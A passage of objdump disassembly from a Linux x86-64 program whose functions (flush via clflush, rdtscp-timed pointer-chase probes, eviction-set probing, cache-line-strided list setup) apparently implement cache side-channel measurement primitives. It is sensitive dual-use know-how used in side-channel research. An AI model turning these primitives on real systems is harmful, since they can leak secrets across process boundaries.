    107b:	e9 a0 ff ff ff       	jmp    1020 <_init+0x20>

0000000000001080 <mmap@plt>:
    1080:	ff 25 a2 4f 00 00    	jmp    *0x4fa2(%rip)        # 6028 <mmap@GLIBC_2.2.5>
    1086:	68 05 00 00 00       	push   $0x5
    108b:	e9 90 ff ff ff       	jmp    1020 <_init+0x20>

0000000000001090 <printf@plt>:
    1090:	ff 25 9a 4f 00 00    	jmp    *0x4f9a(%rip)        # 6030 <printf@GLIBC_2.2.5>
    1096:	68 06 00 00 00       	push   $0x6
    109b:	e9 80 ff ff ff       	jmp    1020 <_init+0x20>

00000000000010a0 <srand@plt>:
    10a0:	ff 25 92 4f 00 00    	jmp    *0x4f92(%rip)        # 6038 <srand@GLIBC_2.2.5>
    10a6:	68 07 00 00 00       	push   $0x7
    10ab:	e9 70 ff ff ff       	jmp    1020 <_init+0x20>

00000000000010b0 <strtol@plt>:
    10b0:	ff 25 8a 4f 00 00    	jmp    *0x4f8a(%rip)        # 6040 <strtol@GLIBC_2.2.5>
    10b6:	68 08 00 00 00       	push   $0x8
    10bb:	e9 60 ff ff ff       	jmp    1020 <_init+0x20>

00000000000010c0 <time@plt>:
    10c0:	ff 25 82 4f 00 00    	jmp    *0x4f82(%rip)        # 6048 <time@GLIBC_2.2.5>
    10c6:	68 09 00 00 00       	push   $0x9
    10cb:	e9 50 ff ff ff       	jmp    1020 <_init+0x20>

00000000000010d0 <fileno@plt>:
    10d0:	ff 25 7a 4f 00 00    	jmp    *0x4f7a(%rip)        # 6050 <fileno@GLIBC_2.2.5>
    10d6:	68 0a 00 00 00       	push   $0xa
    10db:	e9 40 ff ff ff       	jmp    1020 <_init+0x20>

00000000000010e0 <malloc@plt>:
    10e0:	ff 25 72 4f 00 00    	jmp    *0x4f72(%rip)        # 6058 <malloc@GLIBC_2.2.5>
    10e6:	68 0b 00 00 00       	push   $0xb
    10eb:	e9 30 ff ff ff       	jmp    1020 <_init+0x20>

00000000000010f0 <realloc@plt>:
    10f0:	ff 25 6a 4f 00 00    	jmp    *0x4f6a(%rip)        # 6060 <realloc@GLIBC_2.2.5>
    10f6:	68 0c 00 00 00       	push   $0xc
    10fb:	e9 20 ff ff ff       	jmp    1020 <_init+0x20>

0000000000001100 <munmap@plt>:
    1100:	ff 25 62 4f 00 00    	jmp    *0x4f62(%rip)        # 6068 <munmap@GLIBC_2.2.5>
    1106:	68 0d 00 00 00       	push   $0xd
    110b:	e9 10 ff ff ff       	jmp    1020 <_init+0x20>

0000000000001110 <madvise@plt>:
    1110:	ff 25 5a 4f 00 00    	jmp    *0x4f5a(%rip)        # 6070 <madvise@GLIBC_2.2.5>
    1116:	68 0e 00 00 00       	push   $0xe
    111b:	e9 00 ff ff ff       	jmp    1020 <_init+0x20>

0000000000001120 <fopen@plt>:
    1120:	ff 25 52 4f 00 00    	jmp    *0x4f52(%rip)        # 6078 <fopen@GLIBC_2.2.5>
    1126:	68 0f 00 00 00       	push   $0xf
    112b:	e9 f0 fe ff ff       	jmp    1020 <_init+0x20>

0000000000001130 <perror@plt>:
    1130:	ff 25 4a 4f 00 00    	jmp    *0x4f4a(%rip)        # 6080 <perror@GLIBC_2.2.5>
    1136:	68 10 00 00 00       	push   $0x10
    113b:	e9 e0 fe ff ff       	jmp    1020 <_init+0x20>

0000000000001140 <getline@plt>:
    1140:	ff 25 42 4f 00 00    	jmp    *0x4f42(%rip)        # 6088 <getline@GLIBC_2.2.5>
    1146:	68 11 00 00 00       	push   $0x11
    114b:	e9 d0 fe ff ff       	jmp    1020 <_init+0x20>

0000000000001150 <exit@plt>:
    1150:	ff 25 3a 4f 00 00    	jmp    *0x4f3a(%rip)        # 6090 <exit@GLIBC_2.2.5>
    1156:	68 12 00 00 00       	push   $0x12
    115b:	e9 c0 fe ff ff       	jmp    1020 <_init+0x20>

0000000000001160 <fstat@plt>:
    1160:	ff 25 32 4f 00 00    	jmp    *0x4f32(%rip)        # 6098 <fstat@GLIBC_2.33>
    1166:	68 13 00 00 00       	push   $0x13
    116b:	e9 b0 fe ff ff       	jmp    1020 <_init+0x20>

0000000000001170 <rand@plt>:
    1170:	ff 25 2a 4f 00 00    	jmp    *0x4f2a(%rip)        # 60a0 <rand@GLIBC_2.2.5>
    1176:	68 14 00 00 00       	push   $0x14
    117b:	e9 a0 fe ff ff       	jmp    1020 <_init+0x20>

Disassembly of section .plt.got:

0000000000001180 <__cxa_finalize@plt>:
    1180:	ff 25 5a 4e 00 00    	jmp    *0x4e5a(%rip)        # 5fe0 <__cxa_finalize@GLIBC_2.2.5>
    1186:	66 90                	xchg   %ax,%ax

Disassembly of section .text:

0000000000001190 <_start>:
    1190:	31 ed                	xor    %ebp,%ebp
    1192:	49 89 d1             	mov    %rdx,%r9
    1195:	5e                   	pop    %rsi
    1196:	48 89 e2             	mov    %rsp,%rdx
    1199:	48 83 e4 f0          	and    $0xfffffffffffffff0,%rsp
    119d:	50                   	push   %rax
    119e:	54                   	push   %rsp
    119f:	45 31 c0             	xor    %r8d,%r8d
    11a2:	31 c9                	xor    %ecx,%ecx
    11a4:	48 8d 3d 4c 13 00 00 	lea    0x134c(%rip),%rdi        # 24f7 <main>
    11ab:	ff 15 0f 4e 00 00    	call   *0x4e0f(%rip)        # 5fc0 <__libc_start_main@GLIBC_2.34>
    11b1:	f4                   	hlt
    11b2:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
    11b9:	00 00 00 
    11bc:	0f 1f 40 00          	nopl   0x0(%rax)

00000000000011c0 <deregister_tm_clones>:
    11c0:	48 8d 3d f1 4e 00 00 	lea    0x4ef1(%rip),%rdi        # 60b8 <__TMC_END__>
    11c7:	48 8d 05 ea 4e 00 00 	lea    0x4eea(%rip),%rax        # 60b8 <__TMC_END__>
    11ce:	48 39 f8             	cmp    %rdi,%rax
    11d1:	74 15                	je     11e8 <deregister_tm_clones+0x28>
    11d3:	48 8b 05 ee 4d 00 00 	mov    0x4dee(%rip),%rax        # 5fc8 <_ITM_deregisterTMCloneTable@Base>
    11da:	48 85 c0             	test   %rax,%rax
    11dd:	74 09                	je     11e8 <deregister_tm_clones+0x28>
    11df:	ff e0                	jmp    *%rax
    11e1:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
    11e8:	c3                   	ret
    11e9:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)

00000000000011f0 <register_tm_clones>:
    11f0:	48 8d 3d c1 4e 00 00 	lea    0x4ec1(%rip),%rdi        # 60b8 <__TMC_END__>
    11f7:	48 8d 35 ba 4e 00 00 	lea    0x4eba(%rip),%rsi        # 60b8 <__TMC_END__>
    11fe:	48 29 fe             	sub    %rdi,%rsi
    1201:	48 89 f0             	mov    %rsi,%rax
    1204:	48 c1 ee 3f          	shr    $0x3f,%rsi
    1208:	48 c1 f8 03          	sar    $0x3,%rax
    120c:	48 01 c6             	add    %rax,%rsi
    120f:	48 d1 fe             	sar    %rsi
    1212:	74 14                	je     1228 <register_tm_clones+0x38>
    1214:	48 8b 05 bd 4d 00 00 	mov    0x4dbd(%rip),%rax        # 5fd8 <_ITM_registerTMCloneTable@Base>
    121b:	48 85 c0             	test   %rax,%rax
    121e:	74 08                	je     1228 <register_tm_clones+0x38>
    1220:	ff e0                	jmp    *%rax
    1222:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
    1228:	c3                   	ret
    1229:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)

0000000000001230 <__do_global_dtors_aux>:
    1230:	f3 0f 1e fa          	endbr64
    1234:	80 3d 7d 4e 00 00 00 	cmpb   $0x0,0x4e7d(%rip)        # 60b8 <__TMC_END__>
    123b:	75 2b                	jne    1268 <__do_global_dtors_aux+0x38>
    123d:	55                   	push   %rbp
    123e:	48 83 3d 9a 4d 00 00 	cmpq   $0x0,0x4d9a(%rip)        # 5fe0 <__cxa_finalize@GLIBC_2.2.5>
    1245:	00 
    1246:	48 89 e5             	mov    %rsp,%rbp
    1249:	74 0c                	je     1257 <__do_global_dtors_aux+0x27>
    124b:	48 8b 3d 5e 4e 00 00 	mov    0x4e5e(%rip),%rdi        # 60b0 <__dso_handle>
    1252:	e8 29 ff ff ff       	call   1180 <__cxa_finalize@plt>
    1257:	e8 64 ff ff ff       	call   11c0 <deregister_tm_clones>
    125c:	c6 05 55 4e 00 00 01 	movb   $0x1,0x4e55(%rip)        # 60b8 <__TMC_END__>
    1263:	5d                   	pop    %rbp
    1264:	c3                   	ret
    1265:	0f 1f 00             	nopl   (%rax)
    1268:	c3                   	ret
    1269:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)

0000000000001270 <frame_dummy>:
    1270:	f3 0f 1e fa          	endbr64
    1274:	e9 77 ff ff ff       	jmp    11f0 <register_tm_clones>

0000000000001279 <compare_uint64>:
    1279:	55                   	push   %rbp
    127a:	48 89 e5             	mov    %rsp,%rbp
    127d:	48 89 7d e8          	mov    %rdi,-0x18(%rbp)
    1281:	48 89 75 e0          	mov    %rsi,-0x20(%rbp)
    1285:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
    1289:	48 8b 00             	mov    (%rax),%rax
    128c:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
    1290:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
    1294:	48 8b 00             	mov    (%rax),%rax
    1297:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
    129b:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    129f:	48 39 45 f0          	cmp    %rax,-0x10(%rbp)
    12a3:	0f 92 c0             	setb   %al
    12a6:	0f b6 d0             	movzbl %al,%edx
    12a9:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    12ad:	48 3b 45 f0          	cmp    -0x10(%rbp),%rax
    12b1:	0f 92 c0             	setb   %al
    12b4:	0f b6 c0             	movzbl %al,%eax
    12b7:	29 c2                	sub    %eax,%edx
    12b9:	89 d0                	mov    %edx,%eax
    12bb:	5d                   	pop    %rbp
    12bc:	c3                   	ret

00000000000012bd <median_uint64>:
    12bd:	55                   	push   %rbp
    12be:	48 89 e5             	mov    %rsp,%rbp
    12c1:	48 83 ec 10          	sub    $0x10,%rsp
    12c5:	48 89 7d f8          	mov    %rdi,-0x8(%rbp)
    12c9:	48 89 75 f0          	mov    %rsi,-0x10(%rbp)
    12cd:	48 8b 75 f0          	mov    -0x10(%rbp),%rsi
    12d1:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    12d5:	48 8d 15 9d ff ff ff 	lea    -0x63(%rip),%rdx        # 1279 <compare_uint64>
    12dc:	48 89 d1             	mov    %rdx,%rcx
    12df:	ba 08 00 00 00       	mov    $0x8,%edx
    12e4:	48 89 c7             	mov    %rax,%rdi
    12e7:	e8 64 fd ff ff       	call   1050 <qsort@plt>
    12ec:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
    12f0:	83 e0 01             	and    $0x1,%eax
    12f3:	48 85 c0             	test   %rax,%rax
    12f6:	75 3a                	jne    1332 <median_uint64+0x75>
    12f8:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
    12fc:	48 d1 e8             	shr    %rax
    12ff:	48 c1 e0 03          	shl    $0x3,%rax
    1303:	48 8d 50 f8          	lea    -0x8(%rax),%rdx
    1307:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    130b:	48 01 d0             	add    %rdx,%rax
    130e:	48 8b 10             	mov    (%rax),%rdx
    1311:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
    1315:	48 d1 e8             	shr    %rax
    1318:	48 8d 0c c5 00 00 00 	lea    0x0(,%rax,8),%rcx
    131f:	00 
    1320:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    1324:	48 01 c8             	add    %rcx,%rax
    1327:	48 8b 00             	mov    (%rax),%rax
    132a:	48 01 d0             	add    %rdx,%rax
    132d:	48 d1 e8             	shr    %rax
    1330:	eb 19                	jmp    134b <median_uint64+0x8e>
    1332:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
    1336:	48 d1 e8             	shr    %rax
    1339:	48 8d 14 c5 00 00 00 	lea    0x0(,%rax,8),%rdx
    1340:	00 
    1341:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    1345:	48 01 d0             	add    %rdx,%rax
    1348:	48 8b 00             	mov    (%rax),%rax
    134b:	c9                   	leave
    134c:	c3                   	ret

000000000000134d <my_access>:
    134d:	55                   	push   %rbp
    134e:	48 89 e5             	mov    %rsp,%rbp
    1351:	48 89 7d f8          	mov    %rdi,-0x8(%rbp)
    1355:	48 8b 55 f8          	mov    -0x8(%rbp),%rdx
    1359:	48 8b 02             	mov    (%rdx),%rax
    135c:	90                   	nop
    135d:	5d                   	pop    %rbp
    135e:	c3                   	ret

000000000000135f <flush>:
    135f:	55                   	push   %rbp
    1360:	48 89 e5             	mov    %rsp,%rbp
    1363:	48 89 7d f8          	mov    %rdi,-0x8(%rbp)
    1367:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    136b:	0f ae 38             	clflush (%rax)
    136e:	90                   	nop
    136f:	5d                   	pop    %rbp
    1370:	c3                   	ret

0000000000001371 <probe_chase_loop>:
    1371:	55                   	push   %rbp
    1372:	48 89 e5             	mov    %rsp,%rbp
    1375:	53                   	push   %rbx
    1376:	48 89 7d e0          	mov    %rdi,-0x20(%rbp)
    137a:	48 89 75 d8          	mov    %rsi,-0x28(%rbp)
    137e:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
    1382:	48 8b 7d d8          	mov    -0x28(%rbp),%rdi
    1386:	48 89 c3             	mov    %rax,%rbx
    1389:	49 89 d8             	mov    %rbx,%r8
    138c:	49 89 f9             	mov    %rdi,%r9
    138f:	0f ae f0             	mfence
    1392:	0f 01 f9             	rdtscp
    1395:	48 89 c6             	mov    %rax,%rsi

0000000000001398 <loop>:
    1398:	0f ae e8             	lfence
    139b:	4d 8b 00             	mov    (%r8),%r8
    139e:	49 ff c9             	dec    %r9
    13a1:	0f ae e8             	lfence
    13a4:	75 f2                	jne    1398 <loop>
    13a6:	0f ae e8             	lfence
    13a9:	0f 01 f9             	rdtscp
    13ac:	48 29 f0             	sub    %rsi,%rax
    13af:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
    13b3:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
    13b7:	48 8b 5d f8          	mov    -0x8(%rbp),%rbx
    13bb:	c9                   	leave
    13bc:	c3                   	ret

00000000000013bd <probe_evset_chase>:
    13bd:	55                   	push   %rbp
    13be:	48 89 e5             	mov    %rsp,%rbp
    13c1:	53                   	push   %rbx
    13c2:	48 89 7d e0          	mov    %rdi,-0x20(%rbp)
    13c6:	48 8b 05 f3 4c 00 00 	mov    0x4cf3(%rip),%rax        # 60c0 <conf>
    13cd:	48 8b 00             	mov    (%rax),%rax
    13d0:	48 8d 78 01          	lea    0x1(%rax),%rdi
    13d4:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
    13d8:	48 89 c3             	mov    %rax,%rbx
    13db:	49 89 d8             	mov    %rbx,%r8
    13de:	49 89 f9             	mov    %rdi,%r9
    13e1:	0f ae f0             	mfence
    13e4:	0f 01 f9             	rdtscp
    13e7:	48 89 c6             	mov    %rax,%rsi

00000000000013ea <loop2>:
    13ea:	0f ae e8             	lfence
    13ed:	4d 8b 00             	mov    (%r8),%r8
    13f0:	49 ff c9             	dec    %r9
    13f3:	0f ae e8             	lfence
    13f6:	75 f2                	jne    13ea <loop2>
    13f8:	0f ae e8             	lfence
    13fb:	0f 01 f9             	rdtscp
    13fe:	48 29 f0             	sub    %rsi,%rax
    1401:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
    1405:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
    1409:	48 8b 5d f8          	mov    -0x8(%rbp),%rbx
    140d:	c9                   	leave
    140e:	c3                   	ret

000000000000140f <wait>:
    140f:	55                   	push   %rbp
    1410:	48 89 e5             	mov    %rsp,%rbp
    1413:	48 89 7d d8          	mov    %rdi,-0x28(%rbp)
    1417:	48 8d 45 e4          	lea    -0x1c(%rbp),%rax
    141b:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
    141f:	0f 01 f9             	rdtscp
    1422:	89 ce                	mov    %ecx,%esi
    1424:	48 8b 4d f0          	mov    -0x10(%rbp),%rcx
    1428:	89 31                	mov    %esi,(%rcx)
    142a:	48 c1 e2 20          	shl    $0x20,%rdx
    142e:	48 09 d0             	or     %rdx,%rax
    1431:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
    1435:	90                   	nop
    1436:	48 8d 45 e4          	lea    -0x1c(%rbp),%rax
    143a:	48 89 45 e8          	mov    %rax,-0x18(%rbp)
    143e:	0f 01 f9             	rdtscp
    1441:	89 ce                	mov    %ecx,%esi
    1443:	48 8b 4d e8          	mov    -0x18(%rbp),%rcx
    1447:	89 31                	mov    %esi,(%rcx)
    1449:	48 c1 e2 20          	shl    $0x20,%rdx
    144d:	48 09 d0             	or     %rdx,%rax
    1450:	48 2b 45 f8          	sub    -0x8(%rbp),%rax
    1454:	48 3b 45 d8          	cmp    -0x28(%rbp),%rax
    1458:	72 dc                	jb     1436 <wait+0x27>
    145a:	90                   	nop
    145b:	90                   	nop
    145c:	5d                   	pop    %rbp
    145d:	c3                   	ret

000000000000145e <lfsr_create>:
    145e:	55                   	push   %rbp
    145f:	48 89 e5             	mov    %rsp,%rbp
    1462:	48 0f c7 f0          	rdrand %rax
    1466:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
    146a:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    146e:	5d                   	pop    %rbp
    146f:	c3                   	ret

0000000000001470 <lfsr_rand>:
    1470:	55                   	push   %rbp
    1471:	48 89 e5             	mov    %rsp,%rbp
    1474:	48 83 ec 20          	sub    $0x20,%rsp
    1478:	48 89 7d e8          	mov    %rdi,-0x18(%rbp)
    147c:	48 c7 45 f8 00 00 00 	movq   $0x0,-0x8(%rbp)
    1483:	00 
    1484:	eb 1b                	jmp    14a1 <lfsr_rand+0x31>
    1486:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
    148a:	48 8b 00             	mov    (%rax),%rax
    148d:	48 89 c7             	mov    %rax,%rdi
    1490:	e8 1c 00 00 00       	call   14b1 <lfsr_step>
    1495:	48 8b 55 e8          	mov    -0x18(%rbp),%rdx
    1499:	48 89 02             	mov    %rax,(%rdx)
    149c:	48 83 45 f8 01       	addq   $0x1,-0x8(%rbp)
    14a1:	48 83 7d f8 3f       	cmpq   $0x3f,-0x8(%rbp)
    14a6:	76 de                	jbe    1486 <lfsr_rand+0x16>
    14a8:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
    14ac:	48 8b 00             	mov    (%rax),%rax
    14af:	c9                   	leave
    14b0:	c3                   	ret

00000000000014b1 <lfsr_step>:
    14b1:	55                   	push   %rbp
    14b2:	48 89 e5             	mov    %rsp,%rbp
    14b5:	48 89 7d f8          	mov    %rdi,-0x8(%rbp)
    14b9:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    14bd:	83 e0 01             	and    $0x1,%eax
    14c0:	48 85 c0             	test   %rax,%rax
    14c3:	74 19                	je     14de <lfsr_step+0x2d>
    14c5:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    14c9:	48 d1 e8             	shr    %rax
    14cc:	48 89 c2             	mov    %rax,%rdx
    14cf:	48 b8 e2 19 00 00 00 	movabs $0x80000000000019e2,%rax
    14d6:	00 00 80 
    14d9:	48 31 d0             	xor    %rdx,%rax
    14dc:	eb 07                	jmp    14e5 <lfsr_step+0x34>
    14de:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    14e2:	48 d1 e8             	shr    %rax
    14e5:	5d                   	pop    %rbp
    14e6:	c3                   	ret

00000000000014e7 <config_init>:
    14e7:	55                   	push   %rbp
    14e8:	48 89 e5             	mov    %rsp,%rbp
    14eb:	48 83 ec 40          	sub    $0x40,%rsp
    14ef:	48 89 7d e8          	mov    %rdi,-0x18(%rbp)
    14f3:	48 89 75 e0          	mov    %rsi,-0x20(%rbp)
    14f7:	48 89 55 d8          	mov    %rdx,-0x28(%rbp)
    14fb:	48 89 4d d0          	mov    %rcx,-0x30(%rbp)
    14ff:	4c 89 45 c8          	mov    %r8,-0x38(%rbp)
    1503:	4c 89 4d c0          	mov    %r9,-0x40(%rbp)
    1507:	bf 38 00 00 00       	mov    $0x38,%edi
    150c:	e8 cf fb ff ff       	call   10e0 <malloc@plt>
    1511:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
    1515:	4c 8b 45 c8          	mov    -0x38(%rbp),%r8
    1519:	48 8b 7d d0          	mov    -0x30(%rbp),%rdi
    151d:	48 8b 4d d8          	mov    -0x28(%rbp),%rcx
    1521:	48 8b 55 e0          	mov    -0x20(%rbp),%rdx
    1525:	48 8b 75 e8          	mov    -0x18(%rbp),%rsi
    1529:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    152d:	ff 75 10             	push   0x10(%rbp)
    1530:	ff 75 c0             	push   -0x40(%rbp)
    1533:	4d 89 c1             	mov    %r8,%r9
    1536:	49 89 f8             	mov    %rdi,%r8
    1539:	48 89 c7             	mov    %rax,%rdi
    153c:	e8 0a 00 00 00       	call   154b <config_update>
    1541:	48 83 c4 10          	add    $0x10,%rsp
    1545:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    1549:	c9                   	leave
    154a:	c3                   	ret

000000000000154b <config_update>:
    154b:	55                   	push   %rbp
    154c:	48 89 e5             	mov    %rsp,%rbp
    154f:	48 89 7d f8          	mov    %rdi,-0x8(%rbp)
    1553:	48 89 75 f0          	mov    %rsi,-0x10(%rbp)
    1557:	48 89 55 e8          	mov    %rdx,-0x18(%rbp)
    155b:	48 89 4d e0          	mov    %rcx,-0x20(%rbp)
    155f:	4c 89 45 d8          	mov    %r8,-0x28(%rbp)
    1563:	4c 89 4d d0          	mov    %r9,-0x30(%rbp)
    1567:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    156b:	48 8b 55 f0          	mov    -0x10(%rbp),%rdx
    156f:	48 89 10             	mov    %rdx,(%rax)
    1572:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    1576:	48 8b 55 e8          	mov    -0x18(%rbp),%rdx
    157a:	48 89 50 08          	mov    %rdx,0x8(%rax)
    157e:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    1582:	48 8b 55 e0          	mov    -0x20(%rbp),%rdx
    1586:	48 89 50 10          	mov    %rdx,0x10(%rax)
    158a:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    158e:	48 8b 55 d8          	mov    -0x28(%rbp),%rdx
    1592:	48 89 50 18          	mov    %rdx,0x18(%rax)
    1596:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    159a:	48 8b 55 d0          	mov    -0x30(%rbp),%rdx
    159e:	48 89 50 20          	mov    %rdx,0x20(%rax)
    15a2:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    15a6:	48 8b 55 10          	mov    0x10(%rbp),%rdx
    15aa:	48 89 50 28          	mov    %rdx,0x28(%rax)
    15ae:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    15b2:	48 8b 55 18          	mov    0x18(%rbp),%rdx
    15b6:	48 89 50 30          	mov    %rdx,0x30(%rax)
    15ba:	90                   	nop
    15bb:	5d                   	pop    %rbp
    15bc:	c3                   	ret

00000000000015bd <list_init>:
    15bd:	55                   	push   %rbp
    15be:	48 89 e5             	mov    %rsp,%rbp
    15c1:	53                   	push   %rbx
    15c2:	48 83 ec 38          	sub    $0x38,%rsp
    15c6:	48 89 7d c8          	mov    %rdi,-0x38(%rbp)
    15ca:	48 89 75 c0          	mov    %rsi,-0x40(%rbp)
    15ce:	bf 00 00 00 00       	mov    $0x0,%edi
    15d3:	e8 e8 fa ff ff       	call   10c0 <time@plt>
    15d8:	89 c7                	mov    %eax,%edi
    15da:	e8 c1 fa ff ff       	call   10a0 <srand@plt>
    15df:	48 8b 45 c8          	mov    -0x38(%rbp),%rax
    15e3:	48 c7 40 08 00 00 00 	movq   $0x0,0x8(%rax)
    15ea:	00 
    15eb:	48 8b 45 c8          	mov    -0x38(%rbp),%rax
    15ef:	48 c7 00 00 00 00 00 	movq   $0x0,(%rax)
    15f6:	48 8b 45 c8          	mov    -0x38(%rbp),%rax
    15fa:	48 c7 40 10 00 00 00 	movq   $0x0,0x10(%rax)
    1601:	00 
    1602:	48 8b 45 c8          	mov    -0x38(%rbp),%rax
    1606:	48 83 c0 18          	add    $0x18,%rax
    160a:	48 89 45 d0          	mov    %rax,-0x30(%rbp)
    160e:	c7 45 ec 00 00 00 00 	movl   $0x0,-0x14(%rbp)
    1615:	eb 20                	jmp    1637 <list_init+0x7a>
    1617:	8b 45 ec             	mov    -0x14(%rbp),%eax
    161a:	48 98                	cltq
    161c:	48 8d 14 85 00 00 00 	lea    0x0(,%rax,4),%rdx
    1623:	00 
    1624:	48 8b 45 d0          	mov    -0x30(%rbp),%rax
    1628:	48 8d 1c 02          	lea    (%rdx,%rax,1),%rbx
    162c:	e8 3f fb ff ff       	call   1170 <rand@plt>
    1631:	89 03                	mov    %eax,(%rbx)
    1633:	83 45 ec 01          	addl   $0x1,-0x14(%rbp)
    1637:	83 7d ec 09          	cmpl   $0x9,-0x14(%rbp)
    163b:	7e da                	jle    1617 <list_init+0x5a>
    163d:	48 c7 45 e0 01 00 00 	movq   $0x1,-0x20(%rbp)
    1644:	00 
    1645:	e9 d5 00 00 00       	jmp    171f <list_init+0x162>
    164a:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
    164e:	48 c1 e0 06          	shl    $0x6,%rax
    1652:	48 8d 48 c0          	lea    -0x40(%rax),%rcx
    1656:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
    165a:	48 c1 e0 06          	shl    $0x6,%rax
    165e:	48 89 c2             	mov    %rax,%rdx
    1661:	48 8b 45 c8          	mov    -0x38(%rbp),%rax
    1665:	48 01 d0             	add    %rdx,%rax
    1668:	48 8b 55 c8          	mov    -0x38(%rbp),%rdx
    166c:	48 01 ca             	add    %rcx,%rdx
    166f:	48 89 50 08          	mov    %rdx,0x8(%rax)
    1673:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
    1677:	48 c1 e0 06          	shl    $0x6,%rax
    167b:	48 89 c1             	mov    %rax,%rcx
    167e:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
    1682:	48 c1 e0 06          	shl    $0x6,%rax
    1686:	48 89 c2             	mov    %rax,%rdx
    1689:	48 8b 45 c8          	mov    -0x38(%rbp),%rax
    168d:	48 01 d0             	add    %rdx,%rax
    1690:	48 8b 40 08          	mov    0x8(%rax),%rax
    1694:	48 8b 55 c8          	mov    -0x38(%rbp),%rdx
    1698:	48 01 ca             	add    %rcx,%rdx
    169b:	48 89 10             	mov    %rdx,(%rax)
    169e:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
    16a2:	48 c1 e0 06          	shl    $0x6,%rax
    16a6:	48 89 c2             	mov    %rax,%rdx
    16a9:	48 8b 45 c8          	mov    -0x38(%rbp),%rax
    16ad:	48 01 d0             	add    %rdx,%rax
    16b0:	48 c7 00 00 00 00 00 	movq   $0x0,(%rax)
    16b7:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
    16bb:	48 c1 e0 06          	shl    $0x6,%rax
    16bf:	48 89 c2             	mov    %rax,%rdx
    16c2:	48 8b 45 c8          	mov    -0x38(%rbp),%rax
    16c6:	48 01 d0             	add    %rdx,%rax
    16c9:	48 c7 40 10 00 00 00 	movq   $0x0,0x10(%rax)
    16d0:	00 
    16d1:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
    16d5:	48 c1 e0 06          	shl    $0x6,%rax
    16d9:	48 89 c2             	mov    %rax,%rdx
    16dc:	48 8b 45 c8          	mov    -0x38(%rbp),%rax
    16e0:	48 01 d0             	add    %rdx,%rax
    16e3:	48 83 c0 18          	add    $0x18,%rax
    16e7:	48 89 45 d0          	mov    %rax,-0x30(%rbp)
    16eb:	c7 45 dc 00 00 00 00 	movl   $0x0,-0x24(%rbp)
    16f2:	eb 20                	jmp    1714 <list_init+0x157>
    16f4:	8b 45 dc             	mov    -0x24(%rbp),%eax
    16f7:	48 98                	cltq
    16f9:	48 8d 14 85 00 00 00 	lea    0x0(,%rax,4),%rdx
    1700:	00 
    1701:	48 8b 45 d0          	mov    -0x30(%rbp),%rax
    1705:	48 8d 1c 02          	lea    (%rdx,%rax,1),%rbx
    1709:	e8 62 fa ff ff       	call   1170 <rand@plt>
    170e:	89 03                	mov    %eax,(%rbx)
    1710:	83 45 dc 01          	addl   $0x1,-0x24(%rbp)
    1714:	83 7d dc 09          	cmpl   $0x9,-0x24(%rbp)
    1718:	7e da                	jle    16f4 <list_init+0x137>
    171a:	48 83 45 e0 01       	addq   $0x1,-0x20(%rbp)
    171f:	48 8b 45 c0          	mov    -0x40(%rbp),%rax
    1723:	48 c1 e8 06          	shr    $0x6,%rax
    1727:	48 39 45 e0          	cmp    %rax,-0x20(%rbp)
    172b:	0f 82 19 ff ff ff    	jb     164a <list_init+0x8d>
    1731:	90                   	nop
    1732:	90                   	nop
    1733:	48 8b 5d f8          	mov    -0x8(%rbp),%rbx
    1737:	c9                   	leave
    1738:	c3                   	ret

0000000000001739 <list_push>:
    1739:	55                   	push   %rbp
    173a:	48 89 e5             	mov    %rsp,%rbp
    173d:	48 89 7d f8          	mov    %rdi,-0x8(%rbp)
    1741:	48 89 75 f0          	mov    %rsi,-0x10(%rbp)
    1745:	48 83 7d f0 00       	cmpq   $0x0,-0x10(%rbp)
    174a:	74 42                	je     178e <list_push+0x55>
    174c:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
